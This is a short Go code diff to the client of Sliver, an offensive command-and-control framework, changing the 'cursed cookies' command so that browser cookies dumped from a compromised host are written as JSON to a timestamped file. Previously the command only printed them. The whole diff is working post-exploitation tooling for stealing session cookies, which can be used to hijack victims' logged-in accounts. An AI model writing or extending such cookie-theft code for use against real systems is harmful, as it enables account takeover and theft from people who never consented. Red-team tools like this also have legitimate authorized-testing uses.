@@ -19,6 +19,11 @@ package cursed
 */
 
 import (
+	"fmt"
+	"io/ioutil"
+	"strings"
+	"time"
+
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/overlord"
 	"github.com/desertbit/grumble"
@@ -37,8 +42,28 @@ func CursedCookiesCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		return
 	}
 
-	con.PrintInfof("Domain\tName\tValue")
-	for _, cookie := range cookies {
-		con.Printf("%s\t%s\t%s", cookie.Domain, cookie.Name, cookie.Value)
+	con.PrintInfof("Successfully dumped %d cookies\n", len(cookies))
+	if len(cookies) == 0 {
+		return
 	}
+	saveFile := ctx.Flags.String("save")
+	if saveFile == "" {
+		saveFile = fmt.Sprintf("cookies-%s.json", time.Now().Format("20060102150405"))
+	}
+	jsonCookies := []string{}
+	for _, cookie := range cookies {
+		jsonCookie, err := cookie.MarshalJSON()
+		if err != nil {
+			con.PrintErrorf("Failed to marshal cookie: %s\n", err)
+			continue
+		}
+		jsonCookies = append(jsonCookies, string(jsonCookie))
+	}
+	err = ioutil.WriteFile(saveFile, []byte(strings.Join(jsonCookies, "\n")), 0600)
+	if err != nil {
+		con.PrintErrorf("Failed to save cookies: %s\n", err)
+		return
+	}
+	con.PrintInfof("Saved to %s", saveFile)
+	con.Println()
 }
